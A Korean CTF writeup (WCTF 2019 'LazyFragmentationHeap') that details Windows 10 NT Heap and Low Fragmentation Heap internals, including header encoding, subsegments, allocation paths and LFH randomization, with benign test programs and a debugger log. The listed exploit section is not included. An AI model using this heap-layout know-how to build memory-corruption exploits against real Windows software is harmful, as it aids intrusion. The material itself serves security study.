---
layout: "post"
title: "[Writeup] LazyFragmentationHeap - WCTF 2019"
date: "2020-02-07 02:53"
tag:
- windows
headerImage: true
category: blog
author: y0ny0ns0n
---

작성 - y0ny0ns0n @ null2root

# 목차
1. [소개](#1-소개)
2. [환경 구축](#2-환경-구축)
3. [분석](#3-분석)<br>
    3.1. [_HEAP](#31-_HEAP)<br>
    3.2. [_HEAP_ENTRY](#32-_HEAP_ENTRY)<br>
    3.3. [_HEAP_LIST_LOOKUP](#33-_HEAP_LIST_LOOKUP)<br>
    3.4. [_LFH_HEAP](#34-_LFH_HEAP)<br>
    3.5. [_HEAP_BUCKET](#35-_HEAP_BUCKET)<br>
    3.6. [_HEAP_LOCAL_SEGMENT_INFO](#36-_HEAP_LOCAL_SEGMENT_INFO)<br>
    3.7. [_HEAP_SUBSEGMENT](#37-_HEAP_SUBSEGMENT)<br>
    3.8. [_HEAP_USERDATA_HEADER](#38-_HEAP_USERDATA_HEADER)<br>
    3.9. [_INTERLOCK_SEQ](#39-_INTERLOCK_SEQ)<br>
    3.10. [Allocate/Free Non-LFH chunk](#310-Allocate/Free-Non-LFH-chunk)<br>
    3.11. [Allocate/Free LFH chunk](#311-Allocate/Free-LFH-chunk)<br>
4. [익스플로잇](#4-익스플로잇)
5. [후기](#5-후기)
6. [참고자료](#6-참고자료)


# 1. 소개
올해부터 전체적인 공부방향 자체를 Windows ＋α로 잡아보니, Windows 10 NT Heap에 관심이 생겨서 관련 문서를 찾다 이 문제를 보고 한번 풀어보고자 했습니다.

**LazyFragmentationHeap**은 WCTF 2019에서 [Angelboy](https://twitter.com/scwuaptx)가 출제한 문제인데,  Windows의 [Low Fragmentation Heap](https://docs.microsoft.com/en-us/windows/win32/memory/low-fragmentation-heap)( 통칭 LFH )과 관련되어 있습니다.

앞서 말했다시피 이 주제에 대해 공부하기 위해 이 문제를 선택했기 때문에, 제가 기록할 문서의 내용자체에 오류가 있을 수 있습니다. 혹시 그런 오류를 찾으신다면 최하단의 Disqus 댓글을 통해 알려주시면 감사하겠습니다.


# 2. 환경 구축

가상머신 + 문제파일: https://github.com/scwuaptx/LazyFragmentationHeap#vm
- Windows 10 Pro Version 1903 (OS Build 18362.30)
- VirtualBox 6.1.2

**C:\Users\wctf2019\Desktop\challenge** 디렉토리에 있는 **start.bat**을 실행하면 아래와 같이 [AppJailLauncher](https://github.com/trailofbits/AppJailLauncher)를 통해 문제파일에 원격으로 접근할 수 있습니다.

![appjaillauncher worked](/assets/images/lazyfragmentationheap-pic1.png)

문제파일이 동작하는 VM은 앞서 표기한 바와 같이 **Windows 10 Pro Version 1903 (OS Build 18362.30)** 인데, 문제파일 분석을 제외한 LFH에 대한 분석은 제 Host OS 버전인 **Windows 10 Pro Version 1909 (18363.592)** 을 기준으로 하고 있습니다.

다행히 두 버전간의 차이가 크지 않은 탓인지, [BinDiff](https://www.zynamics.com/bindiff.html)로 **ntdll.dll**에서 차이를 비교해 봤을때 아래와 같이 큰 변화가 없어 괜찮을 것이라고 판단했습니다.

![ntdll bindiff](/assets/images/lazyfragmentationheap-pic2.png)


# 3. 분석

Windows Heap 할당 메커니즘은 기존에 존재하던 **NT Heap**과, Windows 10부터 추가된 **Segment Heap**으로 나뉘어 집니다.

**Segment Heap**은 이미 Edge Browser나 대부분의 UWP 앱에서 사용되고 있으며 굉장히 흥미로운 주제이지만, 이번에 분석해볼 LFH는 Windows Vista 시절부터 사용되던 **NT Heap**에 포함된 기능이기 때문에 다음에 기회가 된다면 분석해보겠습니다.

**NT Heap**은 크게 Front-End와 Back-End로 나눠지는데, Front-End가 LFH를 의미합니다. LFH가 비활성화되어 있다면 Heap 메모리 할당 시 바로 Back-End로 넘어가게 됩니다.

Front-End에 해당하는 LFH는 실제 Heap 메모리 할당에는 관여하지 않고, **Low Fragmentation Heap**이라는 이름 그대로 할당된 Heap 메모리간의 [단편화](https://ko.wikipedia.org/wiki/%EB%8B%A8%ED%8E%B8%ED%99%94)를 완화함으로서 보다 더 효율적으로 Heap 메모리를 관리하기 위해 사용됩니다.

LFH는 아래의 코드처럼 동일한 크기의 Heap 메모리를 여러개 할당해 주다 보면 자동으로 활성화 됩니다. 여기서 주의할 점은 할당요청한 Heap 메모리의 크기가 16KB( 0x4000 ) 보다 클 경우, LFH는 해당 메모리를 관리하지 않습니다.

```c
#include <stdio.h>
#include <Windows.h>

int main(void) {
        LPVOID *ptr_arr[80];
        int i;

        for(i = 0; i < 80; i++)
                ptr_arr[i] = malloc(0x80);

        printf("[+] find Heap base address using \"!heap -x %p\" command\n", ptr_arr[0]);
        printf("[+] check if LFH was enabled\n");
        getchar();

        for(i = 0; i < 80; i++)
                free(ptr_arr[i]);

    return 0;
}
```
![LFH enable/disable](/assets/images/lazyfragmentationheap-pic3.png)

( 사족이지만, Windows 에서 할당된 모든 Heap 메모리는 [_HEAP](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1903%2019H1%20(May%202019%20Update)/_HEAP)객체를 통해 관리되는데, [HeapCreate()](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate) 함수로 생성한 private heap을 사용하지 않고 위의 테스트 코드처럼 표준 **malloc()** 함수를 사용해 할당하면 [PEB](https://ko.wikipedia.org/wiki/%ED%94%84%EB%A1%9C%EC%84%B8%EC%8A%A4_%ED%99%98%EA%B2%BD_%EB%B8%94%EB%A1%9D)에 보관되어 있는 기본 Heap 메모리를 사용합니다 )

![_PEB->ProcessHeap](/assets/images/lazyfragmentationheap-pic4.png)

LFH가 활성화되면 **_HEAP->FrontEndHeap**에 새로 할당된 LFH의 주소가 들어가고, **_HEAP->FrontEndHeapType**에 2가 들어가 있는데 이 값은 [HeapQueryInformation()](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapqueryinformation) 함수를 통해 읽어들여 LFH의 활성화 여부를 구별할 때 사용할 수 있습니다.

**_HEAP->FrontEndHeap** 이외에도 LFH가 사용하는 값들을 가지고 있는 구조체들은 개략적으로 아래의 그림과 같이 연결되어 있습니다.

![NT Heap Structure](/assets/images/lazyfragmentationheap-pic5.png)
- **서로 다른 구조체 멤버에서 출발한 화살표들이 같은 구조체를 가리키는 것은 단지 그 멤버들이 같은 구조체를 사용할 뿐 실제로 같은 값을 가진다는 건 아닙니다**
- **Linked List로 연결된 다음 구조체를 가리키는 멤버에는 화살표를 사용하지 않았습니다**
- **포인터가 아닌 구조체 멤버는 이름 밑에 구조체 타입을 명시했습니다**

LFH를 이해하기 위해선 위와 같이 다양한 객체들이 어떤 기능을 수행하는지 먼저 알아볼 필요가 있다고 생각해서, 여러 문서를 참조해 아래와 같이 정리해봤는데 혹시 잘못되었거나 부족한 부분이 있다면 최하단의 Disqus 댓글로 알려주시기 바랍니다.

## 용어 정리

- **Bucket** : LFH에게 할당받은 Heap chunk들을 크기로 분류해 묶어놓은 것이며, **UserBlock**이라고도 부름.
- **SubSegment** : LFH가 Heap 메모리를 효율적으로 관리하기 위해 사용하는 **_HEAP_SUBSEGMENT** 구조체를 의미하며, Heap chunk 크기가 다르면 서로 다른 SubSegment가 사용됨.

## 3.1. _HEAP
: 할당된 Heap 메모리 영역을 관리하기 위해 사용되는 가장 핵심적인 구조체.
- EncodeFlagMask : Heap chunk header가 인코딩되었는지 판단하기 위해 사용되는 값, Heap 초기화 시 0x100000으로 설정됨
- Encoding : Heap header들이 변조 되는것을 방지하기 위한 XOR 인코딩을 위해 사용됨
- BlocksIndex : Back-End에서 Heap chunk들을 관리하기 위해 사용되는 **_HEAP_LIST_LOOKUP** 구조체를 가리킴
- FreeLists : glibc에서 쓰이는 [unsorted bin](https://github.com/bminor/glibc/blob/d614a75/malloc/malloc.c#L1491-L1501)과 비슷하게 할당 해제된 Heap chunk의 **_HEAP_ENTRY** 구조체를 가리킴
- FrontEndHeap : LFH가 비활성화되어 있으면 0으로 초기화된 상태이지만, LFH가 활성화되면 할당된 **_LFH_HEAP** 구조체를 가리킴

## 3.2. [_HEAP_ENTRY](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1909%2019H2%20(November%202019%20Update)/_HEAP_ENTRY)
: glibc에서 쓰이는 [malloc_chunk 구조체의 header 부분](https://github.com/bminor/glibc/blob/d614a75/malloc/malloc.c#L1079-L1083)처럼 할당된 Heap chunk의 header 역할을 하는 구조체.<br>
( LFH냐 아니냐에 따라 서로 다른 방식으로 XOR 인코딩되어 있기 때문에, 실제 값을 알기 위해선 디코딩 과정이 필요함 )

### Non-LFH chunk
![decoding _HEAP_ENTRY](/assets/images/lazyfragmentationheap-pic6.png)

- PreviousBlockPrivateData : 이전에 할당되어 있던 Heap chunk의 값을 보관하는데, 보통 0으로 초기화되어 있음
- Size : **_HEAP_ENTRY** 구조체를 포함한 Heap chunk의 크기이며, 0x10을 곱해야 원래 값을 구할 수 있음
- Flags : Heap chunk가 사용중( BUSY, 1 )인지, 할당해제된 상태( FREE, 0 )인지 식별할 때 사용됨 
- SmallTagIndex : ( **PreviousBlockPrivateData**를 제외한 )**_HEAP_ENTRY** 구조체 앞부분 3 bytes를 XOR한 값을 보관하고 있으며, header의 무결성을 검증하기 위해 사용됨
- PreviousSize : 이전에 할당된 Heap chunk의 크기이며, 0x10을 곱해야 원래 값을 구할 수 있음
- UnusedBytes : 할당 후 남은 메모리 크기를 명시할 때 사용되는데, 이 멤버의 8번째 bit가 1일 경우( UnusedBytes OR 0x80 == 1 ) 이 chunk는 LFH chunk로 인식됨

### LFH chunk
LFH chunk의 경우 **SubSegmentCode**에 아래와 같은 XOR 연산의 결과값을 보관합니다.
```
((&_HEAP_ENTRY - &_HEAP_USERDATA_HEADER) << 0xC) ^
(&_HEAP_ENTRY >> 4) ^
&_HEAP ^
pLFHKey
```

이 결과값을 통해 아래와 같이 해당 LFH chunk의 **_HEAP_USERDATA_HEADER** 구조체와 **_HEAP_SUBSEGMENT** 구조체를 찾을 수 있습니다.

![decoding _HEAP_ENTRY of LFH chunk](/assets/images/lazyfragmentationheap-pic7.png)

- SubSegmentCode :  **_HEAP_USERDATA_HEADER** 구조체와 **_HEAP_SUBSEGMENT** 구조체를 찾기 위해 사용됨
- PreviousSize : ( 이름때문에 헷갈리긴 하지만 )  **_HEAP_USERDATA_HEADER->BitmapData**에서 해당 Heap chunk와 연결된 bit를 찾는 index값으로 사용됨
- UnusedBytes : 할당 후 남은 메모리 크기를 명시할 때 사용되는데, 이 멤버의 8번째 bit가 1일 경우( UnusedBytes OR 0x80 == 1 ) 이 chunk는 LFH chunk로 인식됨

## 3.3. [_HEAP_LIST_LOOKUP](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1909%2019H2%20(November%202019%20Update)/_HEAP_LIST_LOOKUP)
: Back-End에서 Heap chunk를 관리하기 위해 사용하는 구조체.<br>
( _HEAP->BlocksIndex )
- ExtendedLookup : 다음 **_HEAP_LIST_LOOKUP** 구조체를 가리키는 주소가 들어있음
- ArraySize : Heap chunk들의 최대 크기이며, 0x10을 곱해야 원래 값을 구할 수 있음
- ItemCount : 관리중인 Heap chunk들의 개수
- OutOfRangeItems : 관리할 수 있는 최대 크기를 넘어선 Heap chunk들의 개수
- BaseIndex : 현재 **_HEAP_LIST_LOOKUP** 구조체가 관리하고 있는 Heap chunk들의 시작 index 값이며 index의 범위는 현재 **_HEAP_LIST_LOOKUP**의 BaseIndex 부터 **ExtendedLookup**이 가리키는 **_HEAP_LIST_LOOKUP**의 BaseIndex 까지이며, **ListHints**가 할당해제된 Heap chunk를 탐색할 때에도 사용됨
- ListHead : 할당해제된 Heap chunk들을 관리하는 Double Linked List의 Head 역할을 하며, **_HEAP->FreeLists**를 가리킴
- ListInUseUlong : **ListHints**가 가리키는 Heap chunk들 중 어떤게 사용가능한지 가리킴
- ListHints : 할당해제된 Heap chunk들 중 같은 크기들끼리 연결된 Double Linked List를 가리키는 주소의 배열 역할을 함

## 3.4. [_LFH_HEAP](http://terminus.rewolf.pl/terminus/structures/ntdll/_LFH_HEAP_x64.html)
: LFH chunk들을 관리하기 위해 사용되는 구조체.<br>
( _HEAP->FrontEndHeap )
- Heap : 해당 **_LFH_HEAP** 구조체를 가리키는 **_HEAP** 구조체의 시작주소를 가리킴
- Buckets : 할당요청을 받은 Heap chunk 크기와 일치하는 메모리 영역을 찾을 때 사용됨
- SegmentInfoArrays : Heap chunk들을 크기로 분류해 각기 다른 SubSegment( **_HEAP_SUBSEGMENT** )로 관리하기 위해 사용됨
- LocalData : [_HEAP_LOCAL_DATA->LowFragHeap](http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_LOCAL_DATA_x64.html)을 읽어들여 LFH의 주소를 알아내기 위해 사용됨

## 3.5. [_HEAP_BUCKET](http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_BUCKET_x64.html)
: LFH가 Heap chunk를 할당할때 참조하기 위해 사용되며 Bucket을 관리하기 위해 사용되는 구조체.<br>
( _LFH_HEAP->Buckets )
- BlockUnits : 해당 Bucket이 가리키는 Heap chunk의 크기를 찾고자 할 때 사용되며, 0x10을 곱해야 실제 크기를 구할 수 있음
- SizeIndex : 해당 Bucket의 index값을 가지고 있으며, **_LFH_HEAP->SegmentInfoArrays** 배열에서의 index값으로도 사용됨

## 3.6. [_HEAP_LOCAL_SEGMENT_INFO](http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_LOCAL_SEGMENT_INFO_x64.html)
: SubSegment를 관리하기 위해 사용되는 구조체.<br>
( _LFH_HEAP->SegmentInfoArrays )
- LocalData : **_LFH_HEAP->LocalData**를 가리키며, 이를 참조해 **_LFH_HEAP**의 시작주소를 찾을 수 있음
- ActiveSubsegment : LFH의 메모리 할당 요청을 처리하는데 사용될 SubSegment를 가리킴
- CachedItems : **ActiveSubsegment**가 가리키는 SubSegment에서 관리할 수 있는 Heap chunk의 개수를 초과하면 이 배열에서 새로운 SubSegment를 가져옴
- BucketIndex : **ActiveSubsegment**가 가리키는 SubSegment와 연결된 **_LFH_HEAP->Buckets**의 index값( =**_HEAP_BUCKET->SizeIndex** )을 가지고 있음

## 3.7. [_HEAP_SUBSEGMENT](http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_SUBSEGMENT_x64.html)
: LFH가 할당한 Heap chunk들을 각각의 크기별로 관리하기 위해 사용되는 구조체.<br>
( _HEAP_LOCAL_SEGMENT_INFO->ActiveSubsegment, _HEAP_LOCAL_SEGMENT_INFO->CachedItems )
- LocalInfo : 해당 SubSegment를 가리키는 **_HEAP_LOCAL_SEGMENT_INFO** 구조체의 시작주소를 가리킴
- UserBlocks : 해당 SubSegment와 연결된 UserBlock의 시작주소를 가리킴
- AggregateExchg : UserBlock에 남아있는 할당해제된 Heap chunk의 개수를 참조할 때 사용됨
- BlockSize : UserBlock에 할당될 Heap chunk 크기를 보관하고 있으며, 0x10을 곱해야 실제 크기를 구할 수 있음
- BlockCount : UserBlock에 할당되어 있는 Heap chunk의 개수를 보관하고 있음
- SizeIndex : **_HEAP_LOCAL_SEGMENT_INFO->BucketIndex**와 같은 값을 보관하고 있음

## 3.8. [_HEAP_USERDATA_HEADER](http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_USERDATA_HEADER_x64.html)
: UserBlock의 시작부분에 위치해 UserBlock의 header역할을 하는 구조체.<br>
( _HEAP_SUBSEGMENT->UserBlocks )
- SubSegment : 해당 UserBlock과 연결된 SubSegment의 시작주소를 가리킴
- EncodedOffsets : Heap chunk header의 무결성을 검증할 때 사용되며, 아래와 같은 XOR 연산의 결과값이 보관되어 있음
```
(sizeof(_HEAP_USERDATA_HEADER)+8) | ((_HEAP_BUCKET->BlockUnits * 0x10) << 16) ^
pLFHKey ^
&_HEAP_USERBDATA_HEADER ^
&_LFH_HEAP
```
- BusyBitmap : **BusyBitmap->SizeOfBitMap**은 **_HEAP_SUBSEGMENT->BlockCount**와 동일한 값을 가지고 있고, **BusyBitmap->Buffer**가 가리키는 bitmap( **_HEAP_USERDATA_HEADER->BitmapData**를 가리킴 )에서 Heap chunk의 할당여부를 확인할 수 있음
- BitmapData : Heap chunk의 할당 여부를 확인하기 위한 8 bytes짜리 Bitmap 데이터를 가지고 있으며, 특정 index에 해당하는 Heap chunk가 할당되서 사용중이면 해당 index의 bit는 1( BUSY ),  할당해제되었거나 할당된 적이 없으면 0( FREE )으로 표기함

## 3.9. [_INTERLOCK_SEQ](http://terminus.rewolf.pl/terminus/structures/ntdll/_INTERLOCK_SEQ_x64.html)
: 할당 혹은 할당해제된 Heap chunk의 개수를 구할 때 주로 참조하는 구조체.<br>
( _HEAP_SUBSEGMENT->AggregateExchg )
- Depth : 초기값으로 **_HEAP_SUBSEGMENT->BlockCount**와 동일한 값을 가지고 있으며 새로운 Heap chunk를 할당하면 1 감소하고 할당해제 하면 1 증가함


LFH와 관련된 구조체들 중에서 중요한 멤버들에 대해서만 간추려 정리했는데도 꽤 많은 시간이 필요했습니다.

Windows Heap을 처음 공부하는 입장에선 각각의 구조체들이 실제로 어떤 방식으로 사용되는지 좀 헷갈릴 수 있기 때문에, LFH가 관리하지 않는 일반 Heap chunk와 구분해 Heap 메모리 할당 그리고 할당해제 과정이 어떤식으로 동작하는지 아래와 같이 간략하게 정리했습니다.

## 3.10. Allocate/Free Non-LFH chunk
### Allocate
Non-LFH chunk의 경우, 할당요청을 받은 Heap chunk의 크기에 따라 메모리 관리에 약간의 차이가 존재합니다.

#### size <= ( _HEAP->VirtualMemoryThreshold * 0x10 )
1. 만약 요청받은 Heap chunk의 크기가 0x4000 이하라면 LFH가 활성화되어 있는지 검사한다.
2. 요청받은 Heap chunk의 크기가 **_HEAP->BlockIndex**가 가리키는 **_HEAP_LIST_LOOKUP**의 **ArraySize**보다 큰지 확인하고, 만약 크다면 **_HEAP_LIST_LOOKUP->ExtendedLookup**이 가리키는 구조체의 **ArraySize**와 비교해가며 유효한 구조체를 찾는다.
3. **_HEAP_LIST_LOOKUP->ListHint**를 탐색하며 알맞는 크기의 Heap 메모리 영역을 찾아 반환해준다.

#### size > ( _HEAP->VirtualMemoryThreshold * 0x10 )
1. [ZwAllocateVirtualMemory()](https://docs.microsoft.com/en-us/previous-versions/ff566416(v%3Dvs.85)) 함수로 메모리를 할당받아 **_HEAP->VirtualAllocdBlocks**에 삽입한다.<br>
( 위와 같은 방식으로 할당된 Heap chunk는 **_HEAP_ENTRY** 대신 [_HEAP_VIRTUAL_ALLOC_ENTRY](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1909%2019H2%20(November%202019%20Update)/_HEAP_VIRTUAL_ALLOC_ENTRY) 구조체를 header로 사용함 )

### Free
#### size <= ( _HEAP->VirtualMemoryThreshold * 0x10 )
1. **_HEAP_ENTRY->UnusedBytes**로 LFH가 관리하던 Heap chunk인지 검사한다.
2. 이전 혹은 이후에 할당된 Heap chunk가 할당해제된 상태라면 할당해제할 해당 chunk와 합친 뒤 합친 크기를 새로 업데이트한다.
3. 만약 합쳐진 Heap chunk가 **_HEAP->FreeLists**의 시작 혹은 끝부분에 삽입할 수 있다면 삽입하고, 안된다면 **_HEAP_LIST_LOOKUP->ListHints**에 삽입한다.<br>
( glibc에서 발생하는 [Unsafe Unlink](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c) 기법과 매우 유사한 형태의 공격이 가능함 )

#### size > ( _HEAP->VirtualMemoryThreshold * 0x10 )
1. Heap header의 무결성을 검사한 후, **_HEAP->VirtualAllocdBlocks**에서 해당 Heap chunk 주소를 제거한 뒤 **ntdll!RtlpSecMemFreeVirtualMemory** 함수로 할당해제한다.

## 3.11. Allocate/Free LFH chunk
### Allocate
1. **_LFH_HEAP->Buckets**를 탐색하며 할당하고자 하는 크기에 맞는 Buckets의 **SizeIndex**를 구해 **_LFH_HEAP->SegmentInfoArrays** 배열의 index로 시용해 알맞는 SubSegment를 구한다.
2. **_HEAP_LOCAL_SEGMENT_INFO->ActiveSubsegment**가 가리키는 SubSegment의 **Depth**를 읽어들여 할당가능한 Heap chunk가 있는지 확인하고, 만약 없다면 **_HEAP_LOCAL_SEGMENT_INFO->CachedItems**에서 새로운 SubSegment를 가져온다.
3. **_HEAP_LOCAL_SEGMENT_INFO->ActiveSubsegment->AggregateExchg->Depth**를 1 감소시킨다.
4. **ntdll!RtlpLowFragHeapRandomData**에서 임의의 위치에 있는 난수 1 byte를 읽어들여 Heap chunk의 index값으로 사용한다.
5. **_HEAP_USERDATA_HEADER->BusyBitmap**이 가리키는 Bitmap의 해당 index에 Heap chunk를 할당할 수 있는지 확인하고 만약 가능하다면 할당한 뒤 주소를 반환해주고 아니면 인접한 다른 index를 탐색한다.

### Free
1. header를 디코딩해 **_HEAP_USERDATA_HEADER**와 **_HEAP_SUBSEGMENT**의 주소를 구한다.
2. **_HEAP_ENTRY->UnusedBytes**의 값을 0x80으로 수정한다.
3. Bitmap에서 할당해제할 Heap chunk와 index가 같은 bit를 0으로 수정하고, **_HEAP_SUBSEGMENT->AggregateExchg->Depth**를 1 증가시킨다.


LFH가 활성화되면 보안적인 관점에서 가장 눈에 띄는 차이점은 Heap chunk간의 위치가 Non-Deterministic, 쉽게 말해 내가 할당요청을 보낸 Heap chunk가 어디에 위치할 지 모른단 점입니다.

보통 우리에게 익숙한 glibc에서의 Heap 익스플로잇 기법들은 대부분 같은 크기인 Heap chunk들간의 크기와 서로간의 간격을 알 수 있어 뒤에 위치한 Heap chunk의 header나 ( 만약 뒤에 있는 Heap chunk가 할당해제된 상태면 )FD와 BK를 조작하거나 Top chunk를 조작하는 형태로 이루어집니다.

LFH가 비활성화된 Heap chunk라면 앞서 말한바와 같이 이러한 기법을 응용해 사용할 수도 있겠지만, LFH는 같은 크기로 할당된 Heap chunk들이 서로 어디에 위치해 있는지 알 수 없기 때문에 약간의 어려움이 있습니다.

[Saar Amar](https://twitter.com/AmarSaar)이 전에 Heap chunk를 할당하기 위해 **ntdll!RtlpLowFragHeapRandomData**에서 랜덤한 index를 읽어들일 때 해당 데이터가 한번 설정된 후 계속 고정되어 있고, 데이터를 읽어들이는 순서가 순차적이라는 점을 이용해 [LFH의 Non-Deterministic한 특징을 우회할 수 있는 취약점](https://github.com/saaramar/Deterministic_LFH)을 찾은 적은 있지만 이 취약점은 Windows 10 Version 16179부터 패치되었기 때문에 아래와 같이 취약점이 발생하지 않습니다.

![vuln mitigated](/assets/images/lazyfragmentationheap-pic8.png)

이 부분은 간단한 테스트 코드로 확인해 보실 수 있습니다.

```c
#include <stdio.h>
#include <Windows.h>

#define SIZE 0x80

int main(void) {
	LPVOID *ptr_arr[0x112];
	int i;
	HANDLE hHeap;

	hHeap = HeapCreate(0, 0, 0);

	// activate LFH
	for(i = 0; i < 0x12; i++)
		ptr_arr[i] = HeapAlloc(hHeap, 8, SIZE);

	printf("[+] create BP print hook NOW\n");
	getchar();

	for(i = 0x12; i < 0x112; i++)
		ptr_arr[i] = HeapAlloc(hHeap, 8, SIZE);

	printf("[+] All allocated heap chunks are going to be de-allocated");
	getchar();

	for(i = 0; i < 0x112; i++)
		HeapFree(hHeap, 0, ptr_arr[i]);

    HeapDestroy(hHeap);
    return 0;
}

/*
ntdll.dll version == 10.0.18362.418

0:001> bp ntdll+3C4AD ".printf \"currIdx=0x%p\\r\\n\", @rax; g"
0:001> g
currIdx=0x0000000000000010
currIdx=0x0000000000000011
currIdx=0x0000000000000012
currIdx=0x0000000000000013
currIdx=0x0000000000000014
currIdx=0x0000000000000015
currIdx=0x0000000000000016
currIdx=0x0000000000000017
currIdx=0x0000000000000018
currIdx=0x0000000000000019
currIdx=0x000000000000001a
currIdx=0x000000000000001b
currIdx=0x000000000000001c
currIdx=0x000000000000001d
currIdx=0x000000000000001e
currIdx=0x000000000000001f
currIdx=0x0000000000000020
currIdx=0x0000000000000021
currIdx=0x0000000000000022
currIdx=0x0000000000000023
currIdx=0x0000000000000024
currIdx=0x0000000000000025
currIdx=0x0000000000000026
currIdx=0x0000000000000027
currIdx=0x0000000000000028
currIdx=0x0000000000000029
currIdx=0x000000000000002a
currIdx=0x000000000000002c
currIdx=0x000000000000002d
currIdx=0x000000000000002e
currIdx=0x000000000000002f
currIdx=0x0000000000000030
currIdx=0x0000000000000031
currIdx=0x0000000000000032
currIdx=0x0000000000000033
currIdx=0x0000000000000034
currIdx=0x0000000000000035
currIdx=0x0000000000000036
currIdx=0x0000000000000037
currIdx=0x0000000000000038
currIdx=0x0000000000000039
currIdx=0x000000000000003a
currIdx=0x000000000000003b
currIdx=0x000000000000003c
currIdx=0x000000000000003d
currIdx=0x000000000000003e
currIdx=0x000000000000003f
currIdx=0x0000000000000040
currIdx=0x0000000000000041
currIdx=0x0000000000000042
currIdx=0x0000000000000043
currIdx=0x0000000000000044
currIdx=0x0000000000000045
currIdx=0x0000000000000046
currIdx=0x0000000000000047
currIdx=0x0000000000000048
currIdx=0x0000000000000049
currIdx=0x000000000000004a
currIdx=0x000000000000004b
currIdx=0x000000000000004c
currIdx=0x000000000000004d
currIdx=0x000000000000004e
currIdx=0x000000000000004f
currIdx=0x0000000000000050
currIdx=0x0000000000000051
currIdx=0x0000000000000052
currIdx=0x0000000000000053
currIdx=0x0000000000000054
currIdx=0x0000000000000055
currIdx=0x0000000000000056
currIdx=0x0000000000000057
currIdx=0x0000000000000058
currIdx=0x0000000000000059
currIdx=0x000000000000005a
currIdx=0x000000000000005b
currIdx=0x000000000000005c
currIdx=0x000000000000005d
currIdx=0x000000000000005e
currIdx=0x000000000000005f
currIdx=0x0000000000000060
currIdx=0x0000000000000061
currIdx=0x0000000000000062
currIdx=0x0000000000000063
currIdx=0x0000000000000065
currIdx=0x0000000000000066
currIdx=0x0000000000000067
currIdx=0x0000000000000068
currIdx=0x0000000000000069
currIdx=0x000000000000006a
currIdx=0x000000000000006b
currIdx=0x000000000000006c
currIdx=0x000000000000006d
currIdx=0x000000000000006e
currIdx=0x000000000000006f
currIdx=0x0000000000000070
currIdx=0x0000000000000071
currIdx=0x0000000000000072
currIdx=0x0000000000000073
currIdx=0x0000000000000074
currIdx=0x0000000000000075
currIdx=0x0000000000000076
currIdx=0x0000000000000077
currIdx=0x0000000000000078
currIdx=0x0000000000000079
currIdx=0x000000000000007a
currIdx=0x000000000000007b
currIdx=0x000000000000007c
currIdx=0x000000000000007d
currIdx=0x000000000000007e
currIdx=0x000000000000007f
currIdx=0x0000000000000080
currIdx=0x0000000000000081
currIdx=0x0000000000000082
currIdx=0x0000000000000083
currIdx=0x0000000000000084
currIdx=0x0000000000000085
currIdx=0x0000000000000086
currIdx=0x0000000000000087
currIdx=0x0000000000000088
currIdx=0x0000000000000089
currIdx=0x000000000000008a
currIdx=0x000000000000008b
currIdx=0x000000000000008c
currIdx=0x000000000000008d
currIdx=0x000000000000008e
currIdx=0x000000000000008f
currIdx=0x0000000000000090
currIdx=0x0000000000000091
currIdx=0x0000000000000092
currIdx=0x0000000000000093
currIdx=0x0000000000000094
currIdx=0x0000000000000095
currIdx=0x0000000000000096
currIdx=0x0000000000000097
currIdx=0x0000000000000098
currIdx=0x0000000000000099
currIdx=0x000000000000009a
currIdx=0x000000000000009b
currIdx=0x000000000000009c
currIdx=0x000000000000009e
currIdx=0x000000000000009f
currIdx=0x00000000000000a0
currIdx=0x00000000000000a1
currIdx=0x00000000000000a2
currIdx=0x00000000000000a3
currIdx=0x00000000000000a4
currIdx=0x00000000000000a5
currIdx=0x00000000000000a6
currIdx=0x00000000000000a7
currIdx=0x00000000000000a8
currIdx=0x00000000000000a9
currIdx=0x00000000000000aa
currIdx=0x00000000000000ab
currIdx=0x00000000000000ac
currIdx=0x00000000000000ad
currIdx=0x00000000000000ae
currIdx=0x00000000000000af
currIdx=0x00000000000000b0
currIdx=0x00000000000000b1
currIdx=0x00000000000000b2
currIdx=0x00000000000000b3
currIdx=0x00000000000000b4
currIdx=0x00000000000000b5
currIdx=0x00000000000000b6
currIdx=0x00000000000000b7
currIdx=0x00000000000000b8
currIdx=0x00000000000000b9
currIdx=0x00000000000000ba
currIdx=0x00000000000000bb
currIdx=0x00000000000000bc
currIdx=0x00000000000000bd
currIdx=0x00000000000000be
currIdx=0x00000000000000bf
currIdx=0x00000000000000c0
currIdx=0x00000000000000c1
currIdx=0x00000000000000c2
currIdx=0x00000000000000c3
currIdx=0x00000000000000c4
currIdx=0x00000000000000c5
currIdx=0x00000000000000c6
currIdx=0x00000000000000c7
currIdx=0x00000000000000c8
currIdx=0x00000000000000c9
currIdx=0x00000000000000ca
currIdx=0x00000000000000cb
currIdx=0x00000000000000cc
currIdx=0x00000000000000cd
currIdx=0x00000000000000ce
currIdx=0x00000000000000cf
currIdx=0x00000000000000d0
currIdx=0x00000000000000d1
currIdx=0x00000000000000d2
currIdx=0x00000000000000d3
currIdx=0x00000000000000d4
currIdx=0x00000000000000d5
currIdx=0x00000000000000d7
currIdx=0x00000000000000d8
currIdx=0x00000000000000d9
currIdx=0x00000000000000da
currIdx=0x00000000000000db
currIdx=0x00000000000000dc
currIdx=0x00000000000000dd
currIdx=0x00000000000000de
currIdx=0x00000000000000df
currIdx=0x00000000000000e0
currIdx=0x00000000000000e1
currIdx=0x00000000000000e2
currIdx=0x00000000000000e3
currIdx=0x00000000000000e4
currIdx=0x00000000000000e5
currIdx=0x00000000000000e6
currIdx=0x00000000000000e7
currIdx=0x00000000000000e8
currIdx=0x00000000000000e9
currIdx=0x00000000000000ea
currIdx=0x00000000000000eb
currIdx=0x00000000000000ec
currIdx=0x00000000000000ed
currIdx=0x00000000000000ee
currIdx=0x00000000000000ef
currIdx=0x00000000000000f0
currIdx=0x00000000000000f1
currIdx=0x00000000000000f2
currIdx=0x00000000000000f3
currIdx=0x00000000000000f4
